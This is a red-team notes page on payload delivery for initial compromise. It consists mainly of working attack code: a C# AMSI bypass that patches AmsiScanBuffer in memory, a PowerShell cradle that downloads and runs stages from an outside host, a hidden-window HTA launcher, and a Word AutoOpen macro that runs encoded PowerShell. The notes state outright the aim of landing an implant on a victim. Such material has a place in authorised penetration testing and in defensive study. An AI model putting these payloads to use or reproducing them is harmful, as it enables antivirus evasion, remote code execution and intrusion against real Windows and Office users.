---
date: 2019-08-02
title: Payload Delivery Techniques
description: Notes for delivering payloads
categories: InitialCompromise
---

## Payload Delivery Techniques
Using a simple keying HTA payload, such as those created by the Demiguise tool from NCC can be useful in landing the second stage of a payload.

demiguise.py -k "environmentKey" -c "powershell.exe -nop -w 1 -enc ENC_PAYLOAD" -o hta.hta -p Outlook.Application

## Bypassing AMSI and Delivering Payloads
AMSI can be used to detect malicious code within a number of scripting engines such as the Windows Script Host, PowerShell and Office VBA macros to name a few. A number of techniques have been leveraged to disable AMSI in order to load our tooling within the environment. One technique which at the time of writing works to bypass AMSI leverages egg hunters to dynamically load the AmsiScanBuffer function and modify the return value to zero returning a clean buffer. This technique was discovered by Context IS - https://www.contextis.com/en/blog/amsi-bypass.

The following code has been slightly modified to perform a check to verify whether AMSI has been disabled:

```
Ref = (
"System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
"System.Runtime.InteropServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
)

$Source = @"
using System;
using System.Runtime.InteropServices;

namespace AMSI {
    // Context code - https://www.contextis.com/en/blog/amsi-bypass
    public class Bypass {

        [DllImport("kernel32")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        private static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        static void Main(string[] args) { }

        public static void Patch() {
            IntPtr hModule = LoadLibrary("amsi.dll");

            IntPtr dllCanUnloadNowAddress = GetProcAddress(hModule, "DllCanUnloadNow");

            byte[] egg = { };
            if (IntPtr.Size == 8) {
                egg = new byte[] {
                    0x4C, 0x8B, 0xDC,       // mov     r11,rsp
                    0x49, 0x89, 0x5B, 0x08, // mov     qword ptr [r11+8],rbx
                    0x49, 0x89, 0x6B, 0x10, // mov     qword ptr [r11+10h],rbp
                    0x49, 0x89, 0x73, 0x18, // mov     qword ptr [r11+18h],rsi
                    0x57,                   // push    rdi
                    0x41, 0x56,             // push    r14
                    0x41, 0x57,             // push    r15
                    0x48, 0x83, 0xEC, 0x70  // sub     rsp,70h
                };
            } else {
                egg = new byte[] {
                    0x8B, 0xFF,             // mov     edi,edi
                    0x55,                   // push    ebp
                    0x8B, 0xEC,             // mov     ebp,esp
                    0x83, 0xEC, 0x18,       // sub     esp,18h
                    0x53,                   // push    ebx
                    0x56                    // push    esi
                };
            }
            IntPtr address = FindAddress(dllCanUnloadNowAddress, egg);
	    // Logic for checking if bypass works
            if(address != IntPtr.Zero)
            {
                Console.WriteLine("0");
            } else { Console.WriteLine("-1"); }

            // Change the memory protection of the memory region
            // PAGE_READWRITE = 0x04
            uint oldProtectionBuffer = 0;
            VirtualProtect(address, (UIntPtr)2, 4, out oldProtectionBuffer);

            // Patch the function
            byte[] patch = { 0x31, 0xC0, 0xC3};
            Marshal.Copy(patch, 0, address, 3);

            // Reinitialise the memory protection of the memory region
            uint a = 0;
            VirtualProtect(address, (UIntPtr)2, oldProtectionBuffer, out a);
        }

        private static IntPtr FindAddress(IntPtr address, byte[] egg) {
            while (true) {
                int count = 0;

                while (true) {
                    address = IntPtr.Add(address, 1);
                    if (Marshal.ReadByte(address) == (byte)egg.GetValue(count)) {
                        count++;
                        if (count == egg.Length)
                            return IntPtr.Subtract(address, egg.Length - 1);
                    } else {
                        break;
                    }
                }
            }
        }
    }
}
"@

Add-Type -ReferencedAssemblies $Ref -TypeDefinition $Source -Language CSharp
```

The checks for AMSI and the delivery methods were taken from RastaMouse's AMSI blog posts:

https://rastamouse.me/2018/10/amsiscanbuffer-bypass---part-2/

The overall idea is to deliver a HTA to the victim in order to pull down the initial AMSI bypass and verify that AMSI is disabled in order to load the second larger implantm, for instance a PoshC2 implant.

The following cradle can be used to achieve the above process:

```
$s = 'iex ((new-object net.webclient).downloadstring("http://10.10.14.5:8081/p")); If([AMSI.Bypass]::Patch() -ne 0) { iex ((new-object net.webclient).downloadstring("http://10.10.14.5:8081/stage")) }'
```

To deliver this cradle, it should be encoded to avoid any issues which could occur if the input is processed.

```
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($s))
```

The encoded cradle can then be placed in a HTA file, such as that below which has been taken again from RastaMouse's AMSI bypass blog posts:

```
<html>
<script language="VBScript">
    Function var_func()
        Dim var_shell
        Set var_shell = CreateObject("Wscript.Shell")
        var_shell.run "powershell.exe -nop -w 1 -enc ENC_PAYLOAD", 0, true
    End Function

    var_func
    self.close
</script>
</html>
```

These methods would only be ideal if the environment does not perform adequate logging against PowerShell and the target runs PowerShell normally within the environment, otherwise these are clear indicators of compromise.

AMSI bypasses can also be implemented in a number of other scripting techniques, the following provides details on implementing these bypasses avoiding PowerShell.

To achieve the same outcome, it is possible to add the following VBA code to a Macro which when executed through Office, such as Word will call out to the web server and pull down the AMSI bypass code and then execute the next stage:

```
Sub AutoOpen()

Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")

obj.Document.Application.ShellExecute "powershell", "-nop -w 1 -enc PAYLOAD_HERE", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0", Null, 0

End Sub
```